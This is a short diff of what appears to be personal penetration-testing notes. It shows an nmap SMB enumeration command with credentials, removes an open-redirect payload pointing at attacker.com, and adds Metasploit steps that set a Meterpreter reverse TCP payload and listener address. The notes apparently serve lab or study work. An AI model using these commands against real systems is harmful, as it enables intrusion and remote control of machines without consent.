@@ -19,5 +19,8 @@ nmap --script smb-enum* --script-args smbusername=IEUSER,smbpass=PA$$WORD! -p445
 
 
 
-redirect=http%3a//google.com///attacker.com
 
+
+after putting target and rhost and lhost 
+>set payload windows/x64/meterpreter/reverse_tcp
+>set lhost 192.168.1.4
